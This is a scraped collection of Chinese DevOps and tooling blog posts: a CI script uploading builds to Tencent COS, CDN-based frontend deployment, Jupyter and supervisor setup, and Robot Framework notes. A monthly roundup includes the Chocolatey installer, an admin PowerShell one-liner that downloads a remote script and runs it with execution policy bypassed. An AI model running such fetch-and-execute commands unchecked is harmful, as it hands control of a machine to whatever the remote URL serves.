src=\u0026#34;{{BUNDLE_URL}}js/vendors.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;{{BUNDLE_URL}}js/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; ... 4. 前端 GitLab 仓库 前端仓库新增了三个文件：\n.gitlab-ci.yml，CI 配置 get_version.sh，获取前端版本脚本 upload.py，上传到腾讯云 COS 脚本 下面是，前端代码仓库的 .gitlab-ci.yml 文件配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 before_script: - source /data/runner/web/bin/activate - which node \u0026amp;\u0026amp; node --version - which npm \u0026amp;\u0026amp; npm --version - LANG=\u0026#34;zh_CN.utf8\u0026#34; - export LC_ALL=zh_CN.UTF-8 stages: - build build-webpack: stage: build cache: untracked: true paths: - ./node_modules script: - echo \u0026#34;start build test\u0026#34; - rm -rf ./static/* - npm install - if [[ $(git log -1 --pretty=%B) = *\u0026#34;[\u0026#34;*\u0026#34;skipbuild\u0026#34;*\u0026#34;]\u0026#34;* \u0026amp;\u0026amp; $CI_COMMIT_REF_NAME = \u0026#39;master\u0026#39; ]]; then echo \u0026#34;skip build\u0026#34;; else npm run build; fi; - source get_version.sh - echo $PACKAGE_VERSION - touch ./static/$PACKAGE_VERSION - if [[ $(git log -1 --pretty=%B) = *\u0026#34;[\u0026#34;*\u0026#34;deploy\u0026#34;*\u0026#34;]\u0026#34;* \u0026amp;\u0026amp; $CI_COMMIT_REF_NAME = \u0026#39;master\u0026#39; ]]; then python upload.py $DEPLOY_CMD ./static $PACKAGE_VERSION; else echo \u0026#34;not deploy\u0026#34;; fi; artifacts: name: \u0026#34;static\u0026#34; paths: - ./static only: - master get_version.sh，获取 package.json 文件中的前端版本号\n1 2 PACKAGE_VERSION=$(cat package.json | grep version | head -1 | awk -F: \u0026#39;{ print $2 }\u0026#39; | sed \u0026#39;s/[\u0026#34;,]//g\u0026#39; | tr -d \u0026#39;[[:space:]]\u0026#39;) export PACKAGE_VERSION DEPLOY_CMD 是在 GitLab Settings Pipelines 页面新增的环境变量，值为：\n1 AKIXXXXXXXN 93nxxxxxxxxXHZE9 ap-shanghai app-120000000 前端文件上传腾讯云 COS 代码脚本，本地 ./static/ 目录，上传到云上 /:version/static/ 目录。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #!/usr/bin/python # -*- coding: utf-8 -*- ############################################ # 使用 cos-python-sdk-v5 上传文件夹到腾讯云 # 安装方式 # pip install cos-python-sdk-v5 # 使用方式 # python upload.py AKIXXXXXXXN 93nxxxxxxxxXHZE9 ap-shanghai app-120000000 ./static 1.0.0 ############################################ import os import sys from qcloud_cos import CosConfig, CosS3Client def main(argv): # 校验参数 if len(argv) == 7 : secret_id = sys.argv[1] # 用户的 secretId secret_key = sys.argv[2] # 用户的 secretKey region = sys.argv[3] # 用户的 Region( \u0026#39;ap-beijing-1\u0026#39;) bucket = sys.argv[4] # 用户的 Bucket filePath = sys.argv[5] # 上传文件夹路径 version = sys.argv[6] # 上传文件 Version，可以理解为 Prefix else: print \u0026#39;argv error\u0026#39; return # 0，获取本地目录文件列表 # 获取文件列表 file_list = [] print \u0026#39;upload dir： %s\u0026#39; % filePath for root, dirs, files in os.walk(\u0026#34;./static\u0026#34;, topdown=False): file_list.extend([os.path.join(root, name).replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;) for name in files]) print \u0026#39;ready to upload num of files %s，list: %s\u0026#39; % (len(file_list), file_list) #1，用户配置 token = None # 使用临时密钥需要传入 Token，默认为空，可不填 scheme = \u0026#39;http\u0026#39; # 指定使用 http/https 协议来访问 COS，默认为 https，可不填 config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token, Scheme=scheme, Timeout=300) # 2. 获取客户端对象 client = CosS3Client(config) print \u0026#39;Get client Success\u0026#39; # 3. 开始上传 result = [] for file in file_list: response = client.put_object_from_local_file( Bucket=bucket, LocalFilePath=file, Key=\u0026#39;/%s%s\u0026#39; % (version, file[1:]), ) result.append((file, response[\u0026#39;ETag\u0026#39;])) print \u0026#39;upload result: %s, Total: %s, Success：%s\u0026#39; % (result, len(file_list), len(result)) if __name__ == \u0026#39;__main__\u0026#39;: main(sys.argv) 5. 最终效果 腾讯云 COS\n访问应用首页\n1 2 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://cdn.domain.com/1.1.3/static/test/js/vendors.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://cdn.domain.com/1.1.3/static/test/js/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; ","description":"","id":427,"section":"post","tags":["博文","CI","优化","部署","PaaS","脚本","DevOps"],"title":"如何利用 CDN 进一步的前后端分离 - CI 脚本","uri":"https://www.chenshaowen.com/blog/ci-script-of-how-to-use-cdn-to-separate-frontend-and-backend-more.html"},{"content":" 最近在优化一下项目，梳理整个链路之后，开始逐步优化，发现了很多可以改进的点。下面是对开发模式、部署方式的一些思考，希望对你有所启发。\n1. 开发背景 1.1 部署方式 如上图，简单描述一下应用的架构。\n采用的是经典三层架构，接入层，逻辑层，存储层。其中，接入层和存储层，是全部应用共用的服务。逻辑层由 K8S 部署，每个应用会有多个实例。\n接入层能支持的并发量很大，由一个 LVS 将流量分给 多个 Nginx 实例。\n逻辑层主要是将代码以 Slug 的形式打包到基础镜像，然后进行多实例部署。为了保证数据一致性，逻辑层不会保存任何状态，状态全部需要通过外部服务的形式管理。\n存储层提供各种状态服务，比如 MySQL、对象存储等。\n1. 2 开发模式 如上图，简单讲一下目前的开发模式。\n我们采用的是前后端分离的开发模式。后端采用的 Django，前端 Webpack + Vuejs。前后端的交互通过 index.html 和接口进行。\n开发者服务分为两部分：CI，CD\nCI，也就是开发者持续集成。开发者分别向同一个仓库，提交代码。为了确保开发质量，会做一些 Merge Request 流程。当代码合并到 master 分支之后，CI Runner 会被触发执行，编译前端 Webpack 工程，然后将编译生成的前端文件和后端代码推送到 SVN 发布仓库。\nCD，持续部署部分主要是由 PaaS Engine 提供。这是一套由 K8S 提供的部署引擎。\n2. 开发问题 虽然采取的是前后端分离的开发模式，但是实际上代码仓库使用的是同一个。这是由于 PaaS Engine 只支持 SVN 方式部署。同时，PaaS Engine 是一套通用的部署引擎，并不会针对前后端开发模式进行特殊适配。\n使用同一个代码仓库进行开发，由于使用不同的目录，代码层面不会产生冲突，但是在部署上进行了强绑定 \u0026mdash; 必须前后端一起部署。这导致了一系列问题。\n代码仓库大，GitLab CI 推送 SVN 慢 PaaS Engine 转发前端静态文件效率低 在开发迭代过程中，线上问题不能即时有效修复 正式环境不能进行灰度测试，只有一个版本 前后端仓库权限混乱，职责不清 不同地区、网络访问应用的速度差别大 3. 前后端更多的分离 个人认为前后端分离最大的意义在于，权责的分离。权，意味着可以自由选择技术，发掘一些有趣有用的东西，取悦自己，也为了更好的发展项目。责，不仅仅是按期完成任务，还意味着需要去思考项目的持续性，优化项目中的问题，预防可能的风险。\n第一步，拆分 Git 仓库。\n如上图，我们将整个应用拆分为两个 Git 仓库。前端同学负责前端的 Git 仓库，后端同学负责后端的 Git 仓库。\n第二步，分开部署。\nPaaS Engine 部署时，拉取的是指定 SVN 仓库代码。这是一个禁锢，应用开发者以为代码需要打包，整合在一起才能部署。\n在对应用进行优化的过程时，我逐步将前端第三方插件移动到 CDN。突然想到，为什么不将整个前端文件都放到 CDN 呢？\n当然可以！静态资源直接使用 CDN，不仅能实现高并发，还能低延时，降低网络和地域的差异。绝对是前端部署的首选。\n如上图，CD 过程被拆分为两个并行独立的步骤。后端依然走之前的发布流程，在 GitLab 合并代码，推送到 SVN 之后，借助 PaaS Engine 进行发布。前端除了 GitLab 上的 Merge Request 和 Code Review 流程，在部署时，不需要走 PaaS ，而是直接发布到 CDN。\n完成这两步，就实现了对前后端权责的再次分离。\n4. 版本管理 前后端统一仓库时，一起部署，版本绑定，不会存在版本错配问题。但是，前后端分开部署之后，版本管理的问题随之而来。\n4.1 前后端对版本文件的管理 前端的文件存储在 CDN，通过约定的目录结构可以实现对版本的管理。\n假设域名为 cdn.domain.com 。\n存储相对路径路径为：\n1 2 /:version_id/js/xxx.js /:version_id/css/xxx.css 对应的完整访问路径为：\n1 2 https://cdn.domain.com/:version_id/js/xxx.js https://cdn.domain.com/:version_id/css/xxx.css 在前后端分离模式中，后端依然需要吐出首页。通过控制 index.html 中引用的静态文件版本，可以达到对前端版本控制的目的。由于只有一套后端发布环境，同时，MySQL 等状态服务不支持回滚，后端的发布，一旦数据库字段发生变更将只能向前滚动。\nindex.html\n1 2 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://cdn.domain.com/{version_id}/js/vendors.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://cdn.domain.com/{version_id}/js/app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 这里的 version_id 是后端数据库中的前端版本号。通过一定策略修改版本号，可以实现灰度测试、A\\B 测试的效果。\n4.2 前后端联调验收策略 前后端代码仓库分离之后，各自发布版本。\n但是前端版本与后端版本，不一定能组成一个可以发布的应用版本。例如，在新的一期迭代过程中，前端完成了功能开发【f5.3.1】，但是后端的当前版本【b3.4.4】没有就绪。\n针对正在迭代中的版本，我们约定一种发布模式，起名为红绿发布。\n如果前后端当前版本联调，验收通过，那么将前后端版本标记为绿色。\n如果前后端有一方，发生调整，会影响之前功能的正常使用，那么将修改的版本标记为红色。\n直至下一次联调版本验收通过，则将前后端版本再次标记为绿色。\n","description":"","id":428,"section":"post","tags":["博文","CI","优化","部署","PaaS"],"title":"如何利用 CDN 进一步的前后端分离","uri":"https://www.chenshaowen.com/blog/how-to-use-cdn-to-separate-frontend-and-backend-more.html"},{"content":"1. node-sass 安装 安装 node-sass 时，在 node scripts/install 阶段会从 github.com 下载 .node 文件，由于网络问题，常常会导致失败。\n可以在项目内添加一个 .npmrc 文件，配置代理安装：\n1 2 sass_binary_site=https://npm.taobao.org/mirrors/node-sass/ registry=https://registry.npm.taobao.org 或者使用 cnpm 安装\n1 2 npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm install node-sass 2. node-gyp 安装 node-gyp 是为 Nodejs 编译 C++ 扩展，使用的编译工具。这里 有详细的各个系统上的安装方法。\n在 Windows 下：\n安装 node-gyp： 1 npm install -g node-gyp 配置 Python2.7 以及 VC ++ build Tools 依赖。 1 npm install --global --production windows-build-tools 在进行编译构建时，node-gyp 会自动从国外服务器下载需要的依赖。\n如果嫌下载速度慢，也可以自行下载应用包。安装之后，通过 npm config set python python2.7，npm config set msvs_version 2015 命令配置。\n3. 更换 Nodejs 版本之后，需要重建缓存 1 2 3 4 5 6 7 8 npm cache clean --force npm update /data/node8/bin/eslint -\u0026gt; /data/node8/lib/node_modules/eslint/bin/eslint.js /data/node8/bin/npm -\u0026gt; /data/node8/lib/node_modules/npm/bin/npm-cli.js /data/node8/bin/npx -\u0026gt; /data/node8/lib/node_modules/npm/bin/npx-cli.js + eslint@5.5.0 + npm@5.10.0 ","description":"","id":429,"section":"post","tags":["博文","前端","Webpack","Nodejs"],"title":"Nodejs 相关的一些安装问题","uri":"https://www.chenshaowen.com/blog/some-installation-problems-about-nodejs.html"},{"content":" 前面提到 Jupyter Notebook 是一个交互式笔记本，支持运行 40 多种编程语言，非常适合教学。最近，学习 Go 语言，就想起了 Jupyter。本文主要描述如何在 Jupyter 里面安装 Python3 和 Go 内核。\n1. Jupyter 安装 在 CentOS 7 中，默认安装了 Python 2.7，有现成的 Python 环境可用。\n安装 Jupyter 1 pip install jupyter 生成密码 在 IPython 中，利用 passwd 函数生成密码 sha1 值。\nipython In [1]: from IPython.lib import passwd In [2]: passwd() Enter password: Verify password: Out[2]: \u0026#39;sha1:************************************************\u0026#39; 生成配置文件 执行命令，jupyter notebook --generate-config，生成 ~/.jupyter/jupyter_notebook_config.py 配置文件。\n编辑 jupyter_notebook_config 文件，新增如下内容：\n1 2 3 4 5 c.NotebookApp.allow_root = True c.NotebookApp.open_browser = False c.NotebookApp.port = 9999 c.NotebookApp.password = u\u0026#39;sha1:************************************************\u0026#39;\u0026#39; c.ContentsManager.root_dir = \u0026#39;/root/jupyter/data\u0026#39; 其中，passwd 为刚才生成的密码 sha1 值，root_dir 为 Jupyter Notebook 数据存放根目录。\n启动 Jupyter 至此，基本就完成了 Jupyter 的安装和配置，可以启动 Jupyter。\n1 jupyter notebook 非 roor 启动时，报错 如果以非 root 权限启动，会报错：OSError: [Errno 13] Permission denied: \u0026lsquo;/run/user/0/jupyter\u0026rsquo;。这是由于没有权限所致。只需要在有权限的目录，使用 virtualenv 创建 Python 环境 /home/jupyter/py2。\n执行命令，修改 XDG_RUNTIME_DIR 值：\n1 export XDG_RUNTIME_DIR=\u0026#34;/home/jupyter/py2/jupyter\u0026#34; 查看 runtime 路径：\n1 2 3 4 5 6 7 8 9 10 11 12 jupyter --path config: /root/.jupyter /usr/etc/jupyter /usr/local/etc/jupyter /etc/jupyter data: /root/.local/share/jupyter /usr/local/share/jupyter /usr/share/jupyter runtime: /home/jupyter/py2/jupyter 2. supervisor 托管 Jupyter 在服务器端运行 Jupyter，为了能够在程序 dump 时，自动拉起，需要将 Jupyter 托管给 supervisor。\n安装 supervisor 1 pip install supervisor 创建配置文件目录 1 mkdir -p /etc/supervisor/conf.d 创建 supervisor 配置文件 1 echo_supervisord_conf \u0026gt; /etc/supervisor/supervisord.conf 编辑 supervisor 配置文件 编辑 /etc/supervisor/supervisord.conf 文件，新增如下内容：\n1 2 [include] files = /etc/supervisor/conf.d/*.ini /etc/supervisor/conf.d/ 文件夹下的所有配置文件，都会被导入 。这样是为了方便管理，可以为每个进程或相关的几个进程单独写成一个配置文件。\n新增 Jupyter 配置 jupyter.ini 新增文件 /etc/supervisor/conf.d/jupyter.ini，内容如下：\n1 2 3 4 5 6 7 8 9 [program:jupyter] command=jupyter notebook --allow-root user=root autostart=true ;autorestart=true ;startsecs=30 ;startretries=5 stdout_logfile=/var/log/jupyter/jupyter-access.log stderr_logfile=/var/log/jupyter/jupyter-error.log 创建日志目录 1 mkdir /var/log/jupyter 启动 supervisor 可以简单的执行，启动 supervisor：\n1 supervisord 也可以指定配置文件启动\n1 /usr/bin/supervisord -c /etc/supervisord.conf 查看状态 supervisorctl supervisorctl 是一个用于与 supervisord 交互的程序。通过 supervisorctl ，我们可以完成对托管进程的管理。下面是一些基本的命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 停止某一个进程，program_name 为 [program:x] 里的 x supervisorctl stop program_name # 启动某个进程 supervisorctl start program_name # 重启某个进程 supervisorctl restart program_name # 结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理) supervisorctl stop groupworker: # 结束 groupworker:name1 这个进程 (start，restart 同理) supervisorctl stop groupworker:name1 # 停止全部进程，注：start、restart、stop 都不会载入最新的配置文件 supervisorctl stop all # 载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程 supervisorctl reload # 根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启 supervisorctl update # 查看进程状态 supervisorctl status 3. Jupyter 配置 Go Kernel gophernotes 是 Jupyter 的 Go 内核。下图是，配置完内核后，在 Jupyter 中执行 Go 的示例：\n安装依赖项 gophernotes 有四个依赖项：\nGo 1.9+ Jupyter Notebook or nteract ZeroMQ 4.X.X pkg-config 在 CentOS 7 上只需安装 ZeroMQ 和 Go， 即可，满足依赖。\n1 yum install zeromq go 安装 gopherdata 1 2 3 go get -u github.com/gopherdata/gophernotes mkdir -p ~/.local/share/jupyter/kernels/gophernotes cp $GOPATH/src/github.com/gopherdata/gophernotes/kernel/* ~/.local/share/jupyter/kernels/gophernotes 没有加入 PATH，找不到 gophernotes 错误提示：OSError: [Errno 2] No such file or directory\n1 ln -s $HOME/go/bin/gophernotes /go/bin/gophernotes 可以按照 GitHub 上面的提示创建软链接，也可以直接将 gophernotes 拷贝到 /usr/bin/ 目录。\n4. Jupyter 配置 Python3 Kernel 配置完 Go，顺手又配置了一下 Python3 。下图是，配置完内核之后，在 Jupyter 执行 Python3 的示例：\n查看可用的 Python3 版本 1 yum search python3 安装 Python36 1 yum install python36 安装 pip3 1 2 wget https://bootstrap.pypa.io/get-pip.py python36 get-pip.py 安装 kernel python36 -m pip install ipykernel python36 -m ipykernel install widgetsnbextension 没有安装并启用，报错 前端错误提示，404，找不到 /jupyter/nbextensions/widgets/notebook/js/extension.js\n安装并启动 widgetsnbextension ，即可。\n1 2 jupyter nbextension install --py widgetsnbextension jupyter nbextension enable widgetsnbextension --py 5. Markdown 增强 notedown 插件，可以使用 Markdown 创建 Jupyter 笔记，同时支持在线新建、编辑 Markdown 文件。\n安装 1 pip install https://github.com/aaren/notedown/tarball/master 配置 编辑 ~/.jupyter/jupyter_notebook_config.py，新增如下内容：\n1 c.NotebookApp.contents_manager_class = \u0026#39;notedown.NotedownContentsManager\u0026#39; 6. 参考 https://github.com/gopherdata/gophernotes ","description":"","id":430,"section":"post","tags":["博文","Jypyter","Go","Python3"],"title":"Jupyter 安装 Python3、Go 内核","uri":"https://www.chenshaowen.com/blog/install-python3-and-go-kernel-in-jupyter.html"},{"content":"切水果 牛顿摆 汤姆猫 ","description":"","id":431,"section":"post","tags":["整理","Demo","游戏"],"title":"有意思的游戏","uri":"https://www.chenshaowen.com/blog/interesting-games.html"},{"content":" 给大家分享一下，最近一个月，关注的一些技术动态。同时，也有一些工具、学习资料、小技巧等有意思的内容。\n前端 Webpack 在今年 2 月份，Webpack 已经推出 4.0.0 的版本。Wepack 4 不再支持 Node.js 4，在编译速度上也有很大优化提升。同时，Webpack 4 移除了 commonchunk 插件，改用了optimization 属性进行更加灵活的配置，这部分可能是升级改造中最复杂的一部分。\nFastpack Fastpack 是一个 JavaScript 应用打包器，目标是做到对于中型应用（约1000个模块）的打包时间小于1000ms，增量重新打包时间低于100ms。\n下面是基准测试结果：\nVue CLI 3.0 尤雨溪在 Medium 上宣布正式发布 Vue CLI 3.0\nVue CLI 的核心目标是为基于 Webpack 4 构建的预配置，提供构建设置。目标是最大限度地减少开发人员配置的次数。\n官方文档：https://cli.vuejs.org/zh/guide/\n后端 Python 版本更新：Python 3.7.0 \u0026amp; 3.6.6 已经放出\n学习资料：\nRealPython：Socket Programming in Python (Guide) ：https://realpython.com/python-sockets/ RealPython：Python Code Quality: Tools \u0026amp; Best Practices：https://realpython.com/python-code-quality/ Python 101 : subprocess 模块：https://python101.pythonlibrary.org/intro.html Python 相关工具 Jupyter Notebook 是以网页的形式打开，可以在网页页面中直接编写代码和运行代码，代码的运行结果也会直接在代码块下显示的程序。Jupyter Notebook 101 Preview Chapter ： http://www.blog.pythonlibrary.org/ PyCharm 2018.2 Out Now，相关链接：https://blog.jetbrains.com/pycharm/2018/07/pycharm-2018-2-out-now/ Nice Vim trick for Python code：https://jugad2.blogspot.com/2018/08/nice-vim-trick-for-python-code.html Seaborn 是一个在 matplotlib 的基础上，进行了更高级的 API 封装的数据可视化工具：https://seaborn.pydata.org/ celery 2018.07.18 版本更新： v4.2.1\n相关链接：http://docs.celeryproject.org/en/latest/whatsnew-4.2.html\n更新特征如下：\n## Result Backends ### New Redis Sentinel Results Backend（Sentinel：哨兵模式，高可用） ### Cassandra Results Backend（cassandra： Apache 分布式 NoSQL 数据库） ### DynamoDB Results Backend（DynamoDB：Amazon 完全托管、无缝扩展的 NoSQL 数据库） ### Python 2/3 Compatibility Fixes ## Canvas ## Tasks ### Bound Tasks as Error Callbacks ### Task Representation ### Custom Requests ### Retries with Exponential Backoff（Exponential Backoff：指数退避算法） ## Sphinx Extension（Sphinx：一种文档工具，它可以令人轻松的撰写出清晰且优美的文档，已成为Python项目首选的文档工具） redis redis 最近发布了 5.0 版本，其中添加了一个新的数据结构 stream，该结构是一个支持多播的可持久化消息队列，并且 Redis 的作者坦言 stream 的设计很大程度上借鉴了 Kafka 的设计。\n工具 Windows 下的 Console Windowns 下使用 CMD、PowerShell 通常不能完全满足开发需求。这里给大家介绍几种 Console 工具：\n特点 Cygwin MinGW/MSYS MSYS2 是否 GNU 否 是 是 更多软件支持 支持绝大多数的 GNU 软件 支持常用软件，Git、Vim 等软件需要独立支持 支持大多数 GNU 软件 更类 Linux Cygwin 在 Windows 中就好像 Wine 在 Linux 中 实现了 Bash 等主要的 Linux 程序 原生 64/32 bit 支持 GCC 编译 内含 MingGW32 交叉编译功能，既支持依赖 cygwin.dll 的程序编译，也支持独立的 Windows 程序编译；可以直接编译 Linux 下的应用程序 支持独立的 Windows 程序编译 支持独立的 Windows 程序编译 中文支持 直接支持中文显示和输入法 需要配置才能支持中文显示和输入，删除一个中文字符需要删除 2 次 支持中文显示和输入法，中文帮助系统和中文提示（部分软件） 运行速度 慢 快 快 Windows 下的包管理工具：chocolatey 官方网站：https://chocolatey.org/\n如何安装 chocolatey ？以管理员权限执行如下命令：\n1 @\u0026#34;%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34; -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \u0026#34;iex ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://chocolatey.org/install.ps1\u0026#39;))\u0026#34; \u0026amp;\u0026amp; SET \u0026#34;PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\u0026#34; 有意思的 Chrome 是如何把 html 文档渲染为页面上的像素的 视频：https://drive.google.com/file/d/1Ky59m-F79ULs4ydMbD4Mp1dBXvs_eDes/view\n文档：https://docs.google.com/presentation/d/1boPxbgNrTU0ddsc144rcXayGA_WF53k96imRH8Mp34Y/edit#slide=id.g25ae9c179b_0_75\n小技巧 Webpack 通过代理解决跨域问题 在本地开发调试时，通常需要访问线上数据， http://localhost:8008/api -\u0026gt; http://online.com/api ， 通过代理能够有效解决跨域问题。通过配置代理，可以有效避免 django-cors-headers 留下的安全隐患。\nconst proxyPath = [ \u0026#39;/api\u0026#39; ] const proxyRule = {} proxyPath.forEach(item =\u0026gt; { proxyRule[item] = { target: \u0026#39;http://online.com\u0026#39;, secure: false, changeOrigin: true } }) devServer: { port: 8008, public: \u0026#39;localhost\u0026#39;, hot: true, proxy: proxyRule } ","description":"","id":432,"section":"post","tags":["整理","月度分享"],"title":"月度分享第一期","uri":"https://www.chenshaowen.com/blog/month-share-1.html"},{"content":"作者: 范冰\n副标题: 创业公司的用户与收入增长秘籍\n出版年: 2015-7\nISBN: 9787121263606\nNotes:\n这是一本针对 ToC 互联网产品、比较 Marketing 的书。\n通过各种真实案例，告诉你互联网产品的玩法。怎样创造产品，获取用户，激发活跃度，提高留存，增加收入，病毒传播。\n如果你是从业人员，这本书能给你在产品设计和运营上一些启发。如果你在传统行业，希望了解互联网公司如何运作，这本书也能提供不错的指引。\n","description":"","id":433,"section":"post","tags":["书籍","用户","增长"],"title":"增长黑客","uri":"https://www.chenshaowen.com/blog/book/growth-hacker.html"},{"content":"1. 下载镜像文件 点击进入，CloudReady 官网下载 DOWNLOAD 64-BIT 或 DOWNLOAD 32-BIT 版本镜像。解压后，得到 cloudready-free-xxx-bit.bin 文件\n2. 安装 Chromebook 恢复工具 首先需要安装 Chrome 浏览器，然后打开页面，安装 Chromebook Recovery Utility。\n3. 制作镜像 第一步，打开 Chromebook Recovery Utility\n第二步，选择 Use local image，再选择刚才解压出来的 .bin 文件\n第三步，选择你的 U 盘然后 Continue\n4. 参考 https://diveng.io/experience-chrome-os-with-cloudready.html ","description":"","id":434,"section":"post","tags":["整理","Demo","系统","浏览器","CloudReady"],"title":"使用 CloudReady 制作 Chrome OS 安装启动盘","uri":"https://www.chenshaowen.com/blog/how-to-use-cloudready-make-chrome-os-boot-disk.html"},{"content":"1. 标准库 Robot Framework 可以直接导入使用的库，在目录 python\\Lib\\site-packages\\robot\\libraries 中。详细说明，可以查看说明文档。\nBuiltin，包含经常需要的关键字。自动导入无需 import，因此总是可用的。\nDialogs，提供了暂停测试执行和从用户的输入方式。\nCollections，提供一组关键词处理 Python 列表和字典。\nOperatingSystem，允许执行各种操作系统相关的任务。允许执行各种操作系统相关的任务，使各种操作系统相关的任务在 Robot Framework 正在运行的系统中执行。\nRemote，远程库接口的一部分。没有自己的任何关键字，作为 Robot Framework 和测试库之间的代理的特殊库。实际测试库可以在不同的机器上运行，可以使用任何编程语言支持 XML-RPC 协议的实现。\nScreenshot，提供关键字来捕获和存储桌面的截图。\nString，用于处理字符串并验证它们的内容的库，用于生成、修改和验证字符串。\nTelnet，支持连接到 Telnet 服务器上打开的连接执行命令。\nXML，用于生成、修改和验证XML文件的库。\nProcess，系统中运行过程的库。\nDateTime，日期和时间转换的库，支持创建和验证日期和时间值以及它们之间的计算。\n2. 扩展库 Robot Framework 需要下载安装后才能使用的库，如下：\nAndroid library，所有 android自动化需要的测试库，内部使用的是 Calabash Android。\niOS library，所有 iOS 自动化需要的测试库，内部使用 Calabash iOS 服务\nappiumlibrary，Android 和 iOS 测试库，内部使用的是 appium。\nHTTP library (livetest)，内部使用 LiveTest 工具的 HTTP 测试的库。\nHTTP library (Requests)，内部使用 request 工具的 HTTP 测试的库。\nMongoDB library，使用 pymongo 和 MongoDB 交互的库。（MongoDB是一个基于分布式文件存储的数据库）。\nDatabase Library (Java)，基于 Java 的数据库测试库。也可使用 Jython 和 Maven central。\nDatabase Library (Python)，基于 Python 数据库测试库。支持任何 Python 解释器，包括Jython。\nwatir-robot，使用Watir的工具的Web测试库。\nseleniumlibrary，Web测试库，内部使用比较流行的selenium工具。利用早期的selenium1.0和本身已经过时。\nselenium2library，使用 selenium2 的 Web 测试库。替换了大部分老的 seleniumlibrary。\nselenium2library java，selenium2library 的 java 接口\nDjango Library，为 Django 的库，一个 Python Web 框架。\nsudslibrary，一种基于泡沫基于 SOAP 的 Web 服务的功能测试库，动态的 SOAP 1.1 的客户端。\nArchive library，处理 .zip 和 .tar 压缩包的库。\nDiff Library，比较两个文件的库。\nFTP library，Robot Framework 上测试和使用 FTP 服务的库。\nSSHLibrary，通过 SSH 连接的在远程机器上执行命令。还支持使用 SFTP 进行文件传输\nrammbock，通用的网络协议测试库；提供简单的方法来指定网络数据包，并检查发送和接收数据包的结果。\nimagehorizonlibrary，跨平台、基于图像识别的 GUI 自动化纯 Python 库。\nautoitlibrary，Windows 的 GUI 测试库，使用 AutoIt 的免费工具作为驱动。\nEclipse Library，使用 SWT 窗口小部件测试 Eclipse RCP 应用程序的库。\nrobotframework-faker，一个服务 faker 的库，faker 的测试数据生成器。\nswinglibrary，用 Swing GUI 测试 java 应用程序库\nremoteswinglibrary，使用 swinglibrary 库测试和连接一个 java 进程，尤其是 java web start 的应用。（Java Web Start 是基于 Java 技术的应用程序的一种部署解决方案，它是连接计算机和 Internet 的便捷通道，允许用户在完全脱离 Web 的情况下运行和管理应用程序）\nMQTT library，测试 MQTT brokers 和应用的库。\n3. 参考 https://github.com/fkromer/awesome-robotframework https://blog.csdn.net/ShiMengRan107/article/details/81222953 ","description":"","id":435,"section":"post","tags":["整理","测试","自动化","DevOps"],"title":"Robot Framework 常用库","uri":"https://www.chenshaowen.com/blog/robot-framework-common-library.html"},{"content":"配置表 Robot Framework 的配置表主要有两种用途。详细说明，请参考这里。\n导入测试、资源文件和变量文件。 定义元数据。 在 Setting 表格中：\n1 2 3 4 5 Library\t引入库 Resource\t引入资源文件 Variables\t引入变量文件 Test Setup\t指定缺省的 test setup Test Teardown\t指定缺省的 test teardown 在测试用例中：\n1 2 3 4 5 6 [Documentation]\t测试用例描述 [Tags]\t测试用例的 Tag [Setup]\t指定开始之前的操作 [Teardown]\t指定结束之后的操作 [Template]\t指定测试目标 [Timeout]\t指定测试用例的超时时间 关键字表中：\n1 2 3 4 5 6 [Documentation]\t关键字的描述 [Tags]\t关键字的 Tag [Arguments]\t定义关键字的参数 [Return]\t指定关键字的返回值 [Teardown]\t指定关键字执行结束之后的操作 [Timeout]\t指定关键字的超时时间 PyCharm 中执行 Robot Framework 安装 IntelliBot 插件。Setting \u0026gt; Plugins \u0026gt; Install JetBrains Plugins 查找 IntelliBot 并安装。 新增 .txt 格式文件。Setting \u0026gt; Editor \u0026gt; File Types 选中 Robot feature，新增 .txt。 新增 External tools 命令。Setting\u0026gt;Tools\u0026gt;External tools，新增如下两条命令： 执行测试套件\n1 2 3 4 Name: Robot Run TestSuite Program: path\\Scripts\\pybot.bat Arguments: -d results $FileName$ Working directory: $FileDir$ 执行测试用例\n1 2 3 4 Name: Robot Run SingleTestCase Program: path\\Scripts\\pybot.bat Arguments: -d results -t \u0026#34;$SelectedText$\u0026#34; ./ Working directory: $FileDir$ 使用时，在编辑区域右键，在 External Tools 中可以看执行 Robot Framework 的命令：\n文件上传 文件上传功能，使用到 Selenium2library 中的关键字 Choose File。\n为了兼容不同系统，文件路径使用 ${/} 而不是 / 。Robot Framework 会根据不同的系统，自适应路径分隔符。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 *** Settings *** Library Selenium2Library *** Test Cases *** 文件上传 [Documentation] 测试上传文件的写法 [Timeout] 20 Open Browser https://image.baidu.com/ Chrome Wait Until Element Is Visible css=.st_camera_off Click Element css=.st_camera_off ${file_path} Set Variable ${CURDIR}${/}mysql.png Choose File id=stfile ${file_path} Sleep 3 Close Browser 文件下载 